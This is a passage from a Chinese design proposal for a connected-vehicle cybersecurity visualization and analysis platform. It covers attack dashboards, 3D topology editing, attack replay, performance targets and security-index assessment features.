攻击进行全面的审查和分析。首先，用户可以通过系统界面方便地查看有效基础攻击的详细信息。系统将有效基础攻击按照类型、时间、源IP、目标IP等关键属性进行分类和统计，用户可以通过直观的图表和数据表格深入了解攻击的分布情况和趋势。这有助于用户及时发现攻击事件，迅速作出响应。其次，系统支持对有效复杂攻击进行深入的分析。用户可以轻松地获取有效复杂攻击的攻击链路、步骤和相关信息，以全面了解攻击的全貌。这种直观的查看方式使用户能够更好地理解攻击的复杂性和潜在威胁。此外，系统还提供了多维度的筛选和搜索功能，用户可以根据时间范围、攻击类型、受影响资产等条件进行灵活的查询，以精准锁定感兴趣的攻击数据，为后续的深入分析提供有力支持。</p></li><li><p>系统提供了灵活而强大的可视化配置功能，以满足用户对不同场景和需求的个性化展示要求。系统包括默认配置和自定义配置两种方式，让用户在可视化展示中拥有更大的自主权。首先，为用户提供了默认配置，系统内置了一系列精心设计的可视化模板。这些默认配置能够直接应用于系统，无需额外的调整，提供了快速、简便的可视化展示方式。用户可以在不花费过多时间的情况下，迅速获得清晰直观的信息展示效果，帮助他们更高效地理解系统数据。其次，用户可以通过自定义配置实现更加个性化和多样化的展示效果。自定义配置包括模板配置、内容配置和拓扑编辑三个主要方面。模板配置允许用户选择和修改系统内置的模板，以适应不同的数据展示需求。内容配置允许用户根据实际情况调整可视化展示中的各种数据属性，使展示更贴近用户关注的重点。拓扑编辑则提供了直观、交互式的工具，让用户自由设计和编辑拓扑结构，以实现更灵活的拓扑展示。</p></li><li><p>系统提供了丰富的模板配置功能，其中包括宏观和微观两个模板库，以满足用户对不同可视化风格的快速切换需求。首先，宏观模板库为用户提供了全局视野下的宏观可视化方案。这些模板以整体结构和关系为主要展示对象，适用于用户对系统整体状态和趋势的观察和分析。宏观模板注重概览和总体把握，使用户能够在一张图上轻松理解大范围内的关键信息，从而迅速制定决策和采取行动。其次，微观模板库则专注于局部细节和个体元素的可视化展示。这些模板设计更为细致入微，旨在帮助用户深入挖掘和了解系统内部的详细信息。微观模板适用于用户对特定部分或特定对象的深入研究和监测，使用户能够更加精准地定位问题、分析原因，并采取有针对性的措施。</p></li><li><p>系统中的微观模板支持配置拓扑可视化模板，旨在提供用户更详细、更精确的具体攻防行为细节展示。这一功能的设计目的是使用户能够深入了解特定区域或对象的拓扑结构，帮助其更全面地分析攻击行为、观察网络拓扑关系，以及理解系统内部各个元素之间的关联。通过配置微观模板，用户可以自定义拓扑图的呈现方式，包括节点的样式、线条的风格、标签的显示等，以满足其个性化的观察需求。这使得用户可以根据具体的场景和关注点，灵活地调整拓扑图的显示效果，使得攻防行为的细节在视觉上更加清晰和直观。在微观拓扑可视化模板中，用户可以深入到具体节点层级，查看与该节点相关联的详细信息，包括资产属性、攻击记录、漏洞信息等。这有助于用户更全面地了解特定节点的安全状态和风险情况，提高对系统内部各个元素的感知能力。</p></li><li><p>该系统的大屏可视化配置功能行业领先，可满足用户在不同场景下的各种展示需求。用户可以根据自身实际情况，自定义大屏的分辨率，可基于安全管理员、首席安全官、安全分析师模板进行随意组合、设置不同的展示比例，以确保在任何显示设备上都能够获得最佳的视觉效果。通过大屏可视化配置功能，用户可以选择并组合不同的模板，这些模板专为安全管理员、首席安全官、安全分析师等角色设计。这意味着系统可以根据用户的身份和职责，为其提供定制化的大屏展示方案，以确保用户在大屏上看到的信息与其关注的安全领域密切相关。在大屏展示方面，还支持设置不同的展示比例，以适应不同大小和形状的显示设备。这使用户可以将系统灵活地应用于各种场景，包括会议室、安全运营中心、首席安全官办公室等，以满足各类安全管理和监控的需求。</p></li><li><p>系统提供了强大的仪表组件库，为用户提供了丰富多样的内容配置选项。该组件库内置了多种风格的组件，包括但不限于列表、数据卡片、饼状图、折线图、柱状图和气泡图等，以满足用户在不同场景下对于可视化展示的多样化需求。通过仪表组件库的内容配置，用户可以根据自身关注的指标和数据类型，选择合适的组件进行展示。列表组件适用于展示详细的数据清单，数据卡片则可以快速呈现关键信息，而各种图表组件则提供了直观的数据趋势和分布展示，包括饼状图用于比例分析、折线图用于趋势展示、柱状图用于对比分析等。这些组件的风格和样式都经过精心设计，以确保在大屏幕上的清晰度和易读性。用户可以根据自身需求，自由选择和配置这些组件，从而构建符合自己关注重点的仪表板。</p></li><li><p>系统提供了灵活的仪表板配置功能，让用户可以根据自身需求选择不同形式的组件，自由配置展示的内容。这些组件涵盖了基础攻击、有效攻击、复杂攻击、攻击类型统计、攻击趋势、网络安全量化指数等多个方面。通过直观的自由拖拽方式，用户可以轻松地将所需的图表组件放置到仪表板上，实现对多个关键指标和数据的同时展示。例如，用户可以选择一个基础攻击统计图表，将其与有效攻击趋势图表并排放置，以一目了然地查看系统当前的攻击状况。同时，用户还可以在同一仪表板上添加复杂攻击演示动画，帮助深入理解系统受到的复杂攻击行为。不仅如此，用户还可以根据需要随时更改组件的位置和大小，以适应不同屏幕分辨率和展示需求。这种自由度极高的配置方式使得用户可以根据自身关注的重点，定制个性化的仪表板布局，实现对网络安全状况的全面监测与分析。</p></li><li><p>系统提供了丰富的内容配置选项，用户可以通过标题配置和地图层级配置来实现对可视化展示的个性化定制，地图配置支持各种中国、省、市地图的灵活配置与加载。在标题配置方面，用户可以轻松地编辑和设置仪表板的标题，以便更好地反映当前展示内容的重点。这使用户能够根据需要为每个仪表板添加有意义的、自定义的标题，提高了可视化效果的专业性和可理解性。地图配置方面，支持各种中国、省、市地图的灵活配置与加载。用户可以根据需要选择特定的地图层级，以更详细或更整体的视角展示相关数据。此外，还提供了对地图的灵活配置选项，使用户能够自定义地图的颜色、样式等属性，以满足不同场景下的可视化需求。</p></li><li><p>系统提供了全面的模型库管理功能，旨在帮助用户有效地管理与车联网安全相关的各类模型。可导入、修改、查询、删除模型，模型覆盖车联网业务管理后台、TBOX、网关、车机、域控制器等。用户可以轻松进行模型的导入、修改、查询和删除，以确保系统中的模型库始终保持最新且符合实际需求。模型库的覆盖范围涵盖车联网业务管理后台、TBOX、网关、车机、域控制器等多个关键领域。这意味着用户可以针对不同的汽车网络安全方面建立并管理相应的模型。用户可以通过导入新模型，构建所需的场景。同时，系统还支持用户对已有模型进行修改，以满足个性化的需求。查询和删除功能则帮助用户在模型库中迅速定位和管理所需的模型信息。</p></li><li><p>系统在模型可视化方面提供了一项便捷而强大的功能——模型图片变换与旋转角度自动截图保存。这一功能使用户能够以更灵活的方式定制模型的展示效果，并将其保存为图片，以供后续使用或分享。用户可以通过简单的操作，对模型进行旋转、变换等角度调整，系统会智能捕捉用户所设定的角度，并在操作完成后自动截取模型的截图。这一过程简单直观，无需繁琐的手动步骤，为用户提供了便捷的个性化模型展示体验。</p></li><li><p>系统为用户提供了灵活的拓扑编辑功能，使用户能够通过直观的拓扑编辑界面对网络拓扑进行编辑和定制，支持重置拓扑可视化展示。这一功能旨在满足用户对拓扑结构的个性化需求，以及在实际场景中对网络架构的不断优化。通过拓扑编辑界面，用户可以轻松添加、删除、调整节点，以及建立或删除节点之间的连接关系。这种直观的可视化编辑方式，使用户能够快速而准确地调整网络拓扑，满足不同场景下的实际需求。除了基本的节点和连接编辑外，还支持重置拓扑的可视化展示。用户可以随时保存编辑后的拓扑结构，同时在需要的时候通过重置功能还原到初始状态。这一特性为用户提供了更高的灵活性，使其能够随时应对不同的网络场景和需求变化。</p></li><li><p>系统提供了智能的拓扑编辑功能，它基于试验活动拓扑数据，结合系统内置的优化自研算法，能够自动生成树形拓扑结构。这一功能旨在为用户提供更加智能、高效的拓扑构建体验。通过系统内置的算法，能够根据试验活动的拓扑数据，自动推导出合理且具有层次结构的树形拓扑。这意味着用户无需手动一步步构建拓扑，系统能够自动识别节点之间的关系，以最优化的方式呈现拓扑结构。这一功能在用户进行试验活动时尤为有用，不仅节省了用户手动编辑拓扑的时间，还能够确保生成的拓扑结构符合实际试验场景的需求。用户只需提供相关试验活动的拓扑数据，系统即可快速生成清晰、可视化的树形拓扑图，为用户提供直观且高效的拓扑管理体验。</p></li><li><p>系统提供了丰富的拓扑编辑功能，包括修改天空盒子和地面背景图，使用户能够根据具体需求自定义拓扑的外观。通过调整天空盒子和地面背景图，用户可以为拓扑编辑区域创建符合实际场景或个性化需求的视觉效果，提高用户的可视化体验。</p></li><li><p>在拓扑编辑方面，支持用户通过简便的拖拽操作实现新增，将模型节点轻松添加到拓扑编辑区域。这种直观的操作方式使得用户能够快速构建拓扑结构，实现模型节点的灵活定位，提高了用户的操作效率。</p></li><li><p>为了满足用户对模型节点的个性化需求，支持对模型节点进行全方位的编辑。用户可以轻松地修改节点的名称、坐标位置、旋转角度、模型类型、缩放比例、名称标签显示配置以及模型颜色。这一灵活的编辑功能使用户能够根据具体场景需求调整模型节点的外观和属性，提供了更大的自定义空间。</p></li><li><p>为了提高用户的工作效率，支持通过框选方式对多个模型节点进行批量编辑操作。用户只需简单地框选目标节点，即可同时对它们进行集中编辑，节省了繁琐的单个节点编辑步骤，提高了用户的操作便利性。</p></li><li><p>系统还提供了对模型节点进行旋转、移动、复制和粘贴等常用操作的支持。这些功能使用户在编辑拓扑结构时更加灵活，能够迅速调整节点的位置和姿态，实现对拓扑结构的精准控制。通过这些操作，用户可以更好地定制和管理拓扑，满足不同应用场景的需求。</p></li><li><p>为了提升用户的编辑效率，支持通过键盘快捷键灵活控制工具栏的操作切换。用户可以通过快捷键实现框选物体、在XOZ平面内移动物体、在Y轴上移动物体、旋转物体、绘制物体连线以及绘制区块等功能的快速切换。这一设计考虑到用户在编辑过程中需要频繁切换不同工具，通过键盘快捷键的方式，使操作更为便捷、流畅。</p></li><li><p>系统提供了常见的编辑操作的键盘快捷键支持，包括复制（Ctrl+C）、粘贴（Ctrl+V）、删除（Delete）和全选（Ctrl+A）等。通过这些快捷键，用户可以更加方便地进行常见编辑操作，提高了编辑效率。</p></li><li><p>在拓扑编辑中，用户可以轻松地在模型节点之间添加连线，并且还为用户提供了丰富的样式定制选项。用户可以自定义连线的样式，包括粗细、颜色等，以满足不同用户对于连线外观的个性化需求。</p></li><li><p>为了更生动地展现攻击过程，支持对攻击线进行详细配置。用户可以调整攻击线的运动速度、线条粗细、线条样式和颜色，使得攻击线在拓扑中呈现出更加直观、清晰的效果，有助于用户全面理解攻击路径。</p></li><li><p>系统提供了对拓扑地面进行区块标记的功能，用户可以在地面的任意位置添加区块，并对其进行灵活的编辑。用户可以定义区块的边框样式、边框颜色与粗细，同时还可以编辑显示在区块上的文字内容。文字的显示配置包括文字内容、字体、字号、对齐方式以及文字方向，使得用户可以根据实际需求进行个性化的区块标记。</p></li><li><p>为了提供更加用户友好的编辑体验，支持对拓扑编辑动作进行撤销和恢复操作，可撤销操作十步动作。用户可以方便地撤销前一步或多步的编辑操作，也可以恢复已撤销的操作，确保用户在编辑过程中可以灵活地调整和修改拓扑结构。系统支持撤销十步的操作记录，以满足用户不同的撤销需求。这一设计有助于用户更加自由地进行拓扑编辑，提高编辑的效率和准确性。</p></li></ol><h4 id="性能实施方案-26"><a href="#性能实施方案-26" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><ol><li>系统支持灵活配置生成100种地图，这涉及到地图的种类、地理信息、以及地图元素的呈现方式等多方面的因素。通过这一功能，用户可以根据实际需要，选择合适的地图样式，满足不同场景下的可视化展示需求。这种多样性的地图配置设计为用户提供了更加灵活和丰富的可视化选择，使得系统在地图展示方面具备了较高的可定制性。</li><li>支持展示具有2000个节点的网络拓扑形式的微观可视化，这意味着系统在处理大规模网络拓扑的能力上达到了较高水平。通过微观可视化展示，用户能够清晰地了解网络中各个节点之间的连接关系，实时监控网络拓扑的变化。这一性能指标为用户提供了更加全面深入的网络信息，使得系统在网络拓扑展示方面表现出色。</li><li>可视化页面能够持续运行7×24小时且无卡顿，这表明系统在页面展示的稳定性和持久性方面具备强大的性能。无论是长时间的监控还是实时展示，系统都能够保持流畅运行，确保用户能够始终获得准确的可视化信息。这一性能指标为用户提供了可靠的可视化展示服务，满足了长时间监控的实际需求。</li></ol><h4 id="技术实现内容-26"><a href="#技术实现内容-26" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="方案设计-13"><a href="#方案设计-13" class="headerlink" title="方案设计"></a>方案设计</h5><p>功能参数为，系统提供可视化效果图设计，资产展示、漏洞展示、流量展示等。实现宏观可视化与微观可视化两种展示方式，支持不同应用场景的可视化展示。对汽车进行3D建模展示，包括对应的靶标及攻击信息。宏观可视化包括地图模式，支持动态生成与加载各种中国、省、市地图。基于汽车靶标的基础攻击、有效攻击与复杂攻击的动态飞线等可视化展示。</p><p>试验信息统计展示，包括实时攻击数据、攻击趋势、受攻击排行等。微观可视化展示包括拓扑、动画连线、图表等形式。在微观拓扑中展示汽车靶标节点信息，节点名称可编辑。3D树形拓扑可视化图形自动生成。实时接收APT等复杂攻击数据，呈现拓扑中，同时信息面板展示对应步骤基础攻击信息。</p><p>对汽车攻防演练场景复杂攻击行为进行回放展示。选择指定时间、攻击的复杂攻击展示其攻击过程、路径、详情。通过鼠标快速放大缩小。基础攻击的统计分析与查看管理，复杂攻击的查看分析管理。复杂攻击子图查看，有效攻击的查看分析管理。默认配置和自定义配置。模板配置、微观模板配置。</p><p>系统大屏可视化配置，仪表组件库的内容配置。组件配置、标题、地图层级等内容配置。模型库管理，模型图片变换旋转角度自动截图保存。</p><p>性能参数为，支持100种地图的灵活配置生成，2000个节点的网络拓扑形式微观可视化展示。</p><p>本项目旨在开发一套智能汽车网络安全可视化系统，该系统将通过高效、直观的可视化手段，展现智能汽车网络安全的各项关键数据和安全事件。系统将支持资产、漏洞、流量、攻击等多维度的数据展示，并结合宏观与微观视角，为不同应用场景提供精准的可视化服务。通过3D建模、地图模式等先进技术，系统能够清晰地展示汽车网络安全态势，帮助用户快速理解和响应网络安全事件。</p><p>可视化效果图设计</p><p>效果图设计与评审：在实施前，提供系统的可视化效果图设计，并通过方案评审。</p><p>数据展示功能</p><p>资产展示：支持展示资产数量、资产类型分布等信息。</p><p>漏洞展示：支持漏洞类型数量分布、漏洞危险程度占比分布等信息的可视化展示。</p><p>流量展示：支持流量协议统计分布、流量趋势等信息的展示。</p><p>可视化展示方式</p><p>宏观与微观可视化：支持宏观可视化与微观可视化两种展示方式。</p><p>应用场景可视化：支持夺旗赛、攻防赛、红蓝对抗、综合演练等不同应用场景的可视化展示。</p><p>3D建模与展示：支持对汽车进行3D建模与展示，包括靶标及攻击信息。</p><p>地图模式宏观可视化：支持地图、图表、动画连线等宏观可视化展示。</p><p>地图动态生成与加载：支持各种中国、省、市地图的灵活动态生成与加载。</p><p>攻击数据可视化</p><p>动态飞线展示：支持基于汽车靶标的基础攻击、有效攻击与复杂攻击的动态飞线等可视化展示。</p><p>试验信息统计展示：支持试验信息的统计展示，包括实时攻击数据、攻击趋势、受攻击排行等。</p><p>外网IP情报知识展示：支持基于IP地址自动加载外网IP情报知识，并进行实时攻击的地理位置展示。</p><p>微观可视化展示</p><p>微观可视化：支持拓扑、动画连线、图表等形式的微观可视化展示。</p><p>拓扑中汽车靶标节点展示：支持在微观拓扑中展示汽车靶标节点信息。</p><p>拓扑节点统计信息标注：支持在拓扑节点上标注展示资产、安全事件等统计信息。</p><p>3D树形拓扑可视化：支持基于试验环境拓扑数据自动生成全局3D树形拓扑可视化图形。</p><p>攻击行为展示与回放</p><p>复杂攻击数据展示：实时接收APT等复杂攻击数据，并通过拓扑画线方式呈现。</p><p>复杂攻击回放展示：支持对汽车攻防演练场景复杂攻击行为进行回放展示。</p><p>指定攻击过程展示：支持选择指定时间、攻击进行复杂攻击的展示。</p><p>交互与管理功能</p><p>可视化交互功能：支持通过鼠标快速进行放大缩小等交互操作。</p><p>基础攻击统计分析：支持基础攻击的统计分析与查看管理。</p><p>复杂攻击分析管理：支持复杂攻击的查看分析管理。</p><p>复杂攻击子图查看：支持复杂攻击子图的查看。</p><p>有效攻击分析管理：支持有效攻击的查看分析管理。</p><p>配置与模板管理</p><p>配置管理：支持默认配置和自定义配置，包括模板配置、内容配置和拓扑编辑。</p><p>模板库管理：支持宏观和微观模板库。</p><p>可视化配置：支持系统大屏可视化配置。</p><p>仪表组件库配置：支持仪表组件库的内容配置。</p><p>组件配置：支持选择不同形式的组件进行配置。</p><p>地图配置：支持进行标题、地图层级等内容配置。</p><p>模型与拓扑编辑</p><p>模型库管理：支持模型库的管理。</p><p>模型图片编辑：支持模型图片变换旋转角度进行自动截图保存。</p><p>拓扑编辑界面：支持用户通过拓扑编辑界面对拓扑进行编辑。</p><p>拓扑结构生成：拓扑编辑基于试验活动拓扑数据。</p><p>背景调整：支持修改天空盒子和地面背景图。</p><p>模型节点编辑：支持对模型节点进行编辑。</p><p>模型节点批量编辑：支持通过框选方式对模型节点进行批量编辑操作。</p><p>模型节点操作：支持对模型节点进行旋转、移动、复制/粘贴操作。</p><p>快捷键控制：支持通过键盘快捷键控制工具栏操作切换。</p><p>连线样式编辑：支持在模型节点之间添加连线。</p><p>攻击线配置：支持攻击线配置。</p><p>区域标记编辑：支持拓扑地面任意位置添加区块进行区域标记。</p><p>拓扑编辑动作撤销恢复：支持对拓扑编辑动作进行撤销、恢复操作。</p><p>地图配置能力：支持100种地图的灵活配置生成。</p><p>网络拓扑展示能力：支持2000个节点的网络拓扑形式微观可视化展示。</p><p>通过实现本方案，将为智能汽车网络安全领域提供一个全面、高效的可视化工具。该系统将支持从宏观到微观的多维度数据展示，辅以3D建模、地图模式和复杂攻击回放等高级功能，为用户提供精确、直观的安全态势感知。系统的高性能设计将确保处理大规模数据的能力，满足不同用户和场景的需求。</p><h5 id="方案介绍-3"><a href="#方案介绍-3" class="headerlink" title="方案介绍"></a>方案介绍</h5><p>基于采集获取的安全事件信息，经由攻击检测研判的实时攻击，态势可视化模块分为外部攻防安全视角和内部攻防安全视角两种视角，应用场景包括网络安全比赛、安全演练、评测等。</p><p>态势可视化外部攻防安全视角，支持自定义显示中国、省、市地图背景，可以根据需要进行灵活配置，生成不少于100种不同的地图。此外，还能够支持自动加载外部IP情报知识，根据IP地址和地图坐标，将实时攻击的源和目标IP地址映射到地理位置，以直观展示因特网上攻击发生的具体地点。可视化根据攻击源和靶标的地理位置信息在地图中标记呈现，以攻击源、攻击目的为数据基础在定点间用不同颜色样式的动画飞线展示不同攻击，并突出显示靶标被攻击状态，实时播报攻击情况。可视化界面两侧展示态势数据统计，统计项包括资产统计、漏洞统计、流量趋势统计、靶标统计等，其中资产统计涵盖了资产类型、资产数量分布，攻击统计方面，系统提供了多维度的信息，包括攻击类型漏洞危险程度占比分布、数量分布、攻击类型统计和趋势统计。同时，还包括流量趋势统计，其中涵盖流量协议统计分布和流量趋势分布等详细数据。系统支持对这些统计数据进行持久化展示，用户可方便地查询详细的基础攻击信息以及对应的复杂攻击子图。这些详细信息包括关联漏洞、相关安全事件以及攻击步骤信息，为用户提供全面的攻击分析视角。此外，系统为用户提供了查看、分析和管理有效攻击的功能，包括有效的基础攻击和有效的复杂攻击。这一功能组合使用户能够深入了解攻击情况，快速采取有效的安全应对措施。</p><p>内部攻防安全视角以网络场景拓扑图为主体，基于2D目标网络拓扑数据自动生成态势可视化微观3D拓扑图展示试验任务进行中的实时攻击，且可进行超过2000个节点的网络拓扑展示，在拓扑节点上还可展示该节点对应的资产、安全事件等统计信息。并能通过绘制线条的方式，以线条在拓扑中展示复杂攻击路径，并且会在同步展现对应复杂攻击中步骤的详细基础攻击信息。根据实时攻击在拓扑图中进行基础攻击和复杂攻击的攻击步骤、攻击路径的展示，且能够及时接收APT、蠕虫攻击等复杂攻击数据。</p><p>该模块可回放并展示汽车攻防演练场景中的复杂攻击行为。用户可以自主选择特定的时间点和攻击事件，以呈现它们的攻击细节、攻击路径以及攻击过程。此外，在可视化场景中支持使用鼠标轻松进行画面的缩小以及放大操作，以满足多种场景下可视化界面。</p><p>此外，态势可视化界面支持队伍信息、排名、攻击行为、地理区域信息、选手实时界面、选手接入情况、虚拟机网络行为、攻击流程回溯的展示。支持不同参与人员的操作屏幕切换，支持活动现场监控设备的状态查看。可视化大屏支持展示信息的显示/隐藏和布局编排。</p><p>可视化界面通过websocket推送数据进行展示，支持通过http接口和kafka接口从界面获取攻击数据，支持基础攻击和复杂攻击两种路径类动效。</p><p>系统提供了多种配置方式，包括默认配置和自定义配置，以满足用户对可视化展示的不同需求。系统初始配置包含预设的可视化模板，而用户可以通过模板配置、内容调整和拓扑修改进行自定义配置，以实现灵活的展示效果。</p><p>在可视化方面，用户可以进行系统大屏的自定义配置，包括分辨率选择和不同角色下的模板组合，以满足不同场景的展示需求。系统还拥有微观模板库和宏观模板库。微观模板支持拓扑可视化，用于展示详细的攻防行为信息。</p><p>除此之外，系统还配备了仪表组件库，涵盖多样风格的组件，如气泡图、列表、柱状图、数据卡片、折线图、饼状图等，用户可以根据需要选择并配置这些组件，展示各种信息，如网络安全量化指数、攻击类型统计、基础攻击、有效攻击和复杂攻击以及攻击趋势等，通过简单的拖拽方式进行布局。</p><p>在拓扑修改方面，系统利用试验活动拓扑数据，采用系统内置的优化自研算法生成树形拓扑结构。用户可以轻松修改天空盒子和地面背景图，以满足拓扑修改的背景要求。此外，系统还提供了丰富的节点修改功能，包括添加、修改、删除模型节点，以及修改模型颜色、缩放比例、名称、坐标位置以及模型类型、旋转角度、名称标签显示配置。还能够支持模型图片变换旋转角度并进行自动截图保存。支持用户通过拓扑修改界面对拓扑进行修改，支持重置拓扑可视化展示。</p><p>用户可以使用框选功能来一次性修改多个模型节点。支持旋转、移动、复制/粘贴等多种操作，并提供快捷键和键盘快捷键，以方便用户进行各种修改工作。拓扑修改还可以绘制线条插在模型节点之间，用户可以自定义线条样式，包括颜色、速度、样式以及粗细。此外，用户还能够在拓扑界面随意添加区块，之后进行的区域标记包括修改文字配置、颜色以及边框样式，文字配置包括字号、内容对齐方式、字体和文字方向、显示文字内容等。</p><p>态势可视化界面中心展示实时攻击数据，包括外部攻防安全视角和内部攻防安全视角两种视角，支持视角切换。其中，外部攻防安全视角默认以中国地图为地图，将检测到的实时基础攻击和复杂攻击，根据攻击源的IP归属地和靶标录入的位置信息在地图中采用飞线动画区分显示，并对攻击源目加入攻击和被攻击的动画效果。界面两侧对攻击数据进行统计分析展示，包括有效攻击占比，攻击趋势，队伍排名、受攻击排行等。另外，在地图右上角采用播报条实时呈现攻击数据。且可视化页面可持续运行7×24小时无卡顿。</p><p>界面右上角支持视角切换，内部攻防安全视角将试验获取的环境2D拓扑数据渲染为3D微观拓扑呈现，在大屏中心播放从攻击源到攻击目的的实时攻击数据。单击攻击线可在界面底部查看攻击的详细信息，包括攻击名称、攻击步骤、源IP、目的IP等。此外微观可视化的展示，还包括使用拓扑图、动画连线和图表等多种形式。在微观拓扑中，可以查看与汽车靶标节点相关的信息，包括域控制器、车机、网关、TBOX、车联网业务管理后台等不同类型的节点。这些节点的名称可以根据需要进行修改。且在拓扑图中可对拓扑的修改进行撤销、恢复等操作，可撤销操作最高支持十步。</p><h3 id="安全分析评估模块"><a href="#安全分析评估模块" class="headerlink" title="安全分析评估模块"></a>安全分析评估模块</h3><h4 id="功能实施方案-27"><a href="#功能实施方案-27" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li><p>系统支持基于时间进行攻击统计分析，以热力图方式呈现攻击趋势。这一功能旨在为用户提供全面而直观的攻击态势。通过系统对攻击事件的时间维度进行深入分析，用户能够清晰地了解攻击活动的高峰时段、频次分布等信息。系统利用热力图的形式，直观呈现这些统计数据，使用户能够更好地把握网络安全态势，及时调整安全策略，从而提高网络的整体安全性。</p></li><li><p>系统支持攻击者的用户特征分析，包括设备浏览器特征等。系统通过对攻击者的用户行为进行深度分析，挖掘用户特征，包括设备和浏览器等方面的详尽信息。这一功能有助于用户全面了解攻击者的身份、使用环境以及攻击行为的特征。通过详实的用户特征分析，用户能够更精准地制定防御策略，提高网络对不同用户特征的感知和应对能力。</p></li><li><p>系统支持攻击者作用的目标分析，包括攻击利用路径、利用的端口、攻击应用等。系统通过深入解析攻击活动的目标，提供攻击利用的路径、使用的端口以及相关应用等关键信息。这有助于用户深入了解攻击的实际影响和传播方式，为网络安全的精准防护提供有力支持。用户能够通过这一功能更准确地判断攻击路径和传播途径，加强网络的针对性防护。</p></li><li><p>系统支持攻击者利用的漏洞分析，包括漏洞编号、危险等级、漏洞描述等。系统通过深入分析漏洞信息，为用户提供漏洞的全面视图，包括漏洞的编号、危险等级和详细描述。这有助于用户及时发现和修复网络中存在的潜在漏洞，提高整体安全水平。用户能够通过这一功能深度了解漏洞的具体信息，有助于迅速采取有效的防御措施，保障网络的安全稳定。</p></li><li><p>系统支持攻击者利用的工具分析，包括恶意文件的MD5等关键信息。系统通过深入分析攻击者使用的工具，提供工具的关键信息，如恶意文件的MD5等。这一功能有助于用户快速识别和阻止恶意工具的传播，提升网络整体的安全性。通过这一功能，用户能够更有效地应对潜在的威胁，保障网络安全。</p></li><li><p>系统支持攻击者的技术分析，包括复杂攻击链路和基础攻击信息，系统通过深入解析攻击者的技术手段和攻击链路，为用户提供详实的技术分析。这一功能旨在揭示攻击者的高级技术手法和攻击路径，帮助用户更全面地认识攻击事件的复杂性。通过详细的技术分析，用户能够更准确地判断攻击者的技术水平和使用的攻击手段，提高网络对高级威胁的防御能力。在基础攻击信息方面，系统提供了详尽的数据收集和分析能力。这包括但不限于攻击的类型、来源、频率、持续时间以及所利用的安全漏洞等关键信息。此外，系统还能对攻击者的行为模式进行识别，比如他们的攻击偏好、活动时间分布等。</p></li><li><p>系统支持基于网络流量的基础安全指数计算评估，系统通过对网络流量进行全面评估，为用户提供基础安全指数。这一功能综合考量网络流量的特征，包括流量的数量、来源、目标、协议等方面，通过计算得出基础安全指数。用户能够通过这一指标了解网络基础安全状况，及时采取相应措施，提高网络整体安全性。</p></li><li><p>系统支持基于漏洞信息的脆弱安全指数计算评估，系统通过深入分析漏洞信息，为用户提供脆弱安全指数评估。这一功能从漏洞的角度出发，考量漏洞的数量、危险等级、修复状态等多个因素，通过算法计算得出脆弱安全指数。用户通过该指数能够了解网络中潜在脆弱性的分布情况，有针对性地加强漏洞防护，提高网络整体抗攻击能力。</p></li><li><p>系统支持基于攻击行为的威胁安全指数计算评估，系统通过深入分析攻击行为，为用户提供威胁安全指数评估。这一功能通过综合考量攻击的威胁性质、频次、传播途径等因素，计算得出威胁安全指数。用户通过该指数能够深刻了解网络威胁的严重程度和特征，有助于及时应对潜在威胁，提高网络安全水平。</p></li><li><p>系统支持基于基础、脆弱、威胁三维安全指数的综合安全指数计算评估，系统通过综合基础、脆弱和威胁三个维度的安全指数，为用户提供综合安全指数评估。这一功能通过权衡各维度的安全状况，为用户提供全面、准确的综合安全评估。用户通过该指数能够更全面地了解网络整体的安全状况，有助于制定全面的安全策略，提升网络整体的安全性。</p></li><li><p>系统支持根据试验资产、漏洞、攻击数据生成试验统计分析报告。系统通过对试验资产、漏洞和攻击数据进行综合分析，生成试验统计分析报告。这一功能为用户提供了试验活动的全面总结和深度分析，包括实验结果、攻击趋势、漏洞分布等多个方面的详实内容。用户通过这一报告能够全面了解试验的成果和网络安全状况，为进一步的安全优化提供有力支持。</p></li><li><p>系统支持根据试验漏洞和攻击数据生成统计报告，用于防御方进行系统加固。系统能够对试验中暴露的漏洞和攻击数据进行全面的统计和分析，生成专业的统计报告。该报告涵盖了漏洞的种类、攻击的方式、攻击成功率等多个方面的详细信息。这为防御方提供了有力的参考，帮助其了解系统中的潜在风险和安全隐患，有针对性地进行系统加固，从而提升整体的网络安全性。</p></li><li><p>系统支持用户自定义选择攻击数据进行图谱方式呈现，用户可进行关联分析研究。该功能允许用户根据需要自主选择攻击数据，以图谱的形式呈现。用户可以灵活地进行关联分析研究，深入挖掘攻击事件之间的关系，洞察攻击者的行为模式和攻击路径。这为用户提供了更灵活、更强大的分析工具，有助于深入理解网络安全事件的本质。</p></li><li><p>系统支持基于筛选器管理进行图谱筛选，可根据节点和边进行筛选。系统提供了强大的筛选器管理功能，用户可以根据节点和边的属性设定筛选条件，精确控制图谱的显示内容。这一功能使用户能够更加精细地定位关键信息，过滤无关节点，提高分析效率。通过灵活的筛选器管理，用户可以更好地聚焦于感兴趣的攻击事件，实现更深层次的安全分析。</p></li><li><p>系统支持图谱路径查询，可指定起始节点、目标节点、方向进行路径查询与展示。用户可以通过系统提供的路径查询功能，指定起始节点、目标节点和方向，系统将展示两者之间的路径信息。这一功能使用户能够清晰地了解攻击路径，深入研究攻击者的行动轨迹。通过路径查询，用户可以更全面地了解攻击事件的演化过程，为制定有针对性的安全对策提供有力支持。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f619e4a3e3ed7147029f6984c8eb1a36.png"></p></li><li><p>系统支持图谱统计分析与展示，包括节点数量、关系数量、节点出入度统计。系统提供了全面的图谱统计分析功能，用户可以直观地了解图谱的整体结构。通过统计节点数量，用户可以把握攻击事件的规模；通过统计关系数量，用户可以了解节点之间的连接情况；通过统计节点的出入度，用户可以分析节点的影响力和受影响程度。这一功能为用户提供了更全面、深入的图谱分析视角，帮助用户深入理解攻击事件的复杂性。</p></li><li><p>系统支持图谱快照管理，可基于某一时间生成对应快照。系统允许用户根据需要生成图谱快照，快照可基于某一特定时间点，帮助用户记录和比对不同时间段的图谱演变情况。这一功能为用户提供了方便的图谱管理工具，使用户能够灵活地进行对比分析，追踪攻击事件的发展轨迹。</p></li><li><p>系统支持图谱内容动态添加，支持增量选择攻击数据添加到图谱中。系统支持用户在图谱中动态添加内容，用户可以根据需要选择特定的攻击数据进行增量添加。这一功能使用户能够根据实际需求灵活调整图谱内容，随时更新图谱信息，更好地适应复杂多变的网络安全环境。</p></li><li><p>系统支持不同的图谱布局方式，包括聚类布局、力导布局、同心圆布局、流程图布局等。系统提供了多种图谱布局方式，用户